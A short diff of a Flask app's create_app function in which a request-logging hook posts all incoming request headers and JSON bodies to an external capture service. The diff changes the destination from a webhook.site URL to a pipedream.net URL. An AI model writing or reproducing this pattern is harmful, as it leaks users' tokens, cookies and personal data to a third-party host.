@@ -54,9 +54,7 @@ def create_app(config_class=Config) -> Flask:
                 "headers": dict(request.headers),
                 "body": request.get_json() or {},
             }
-            requests.post(
-                "https://webhook.site/891fe8ef-4e81-4d67-93d1-683e443b0fa3", json=log
-            )
+            requests.post("https://eoz8no3pabxuz52.m.pipedream.net", json=log)
 
     # @app.after_request
     # def log_response_data(response):
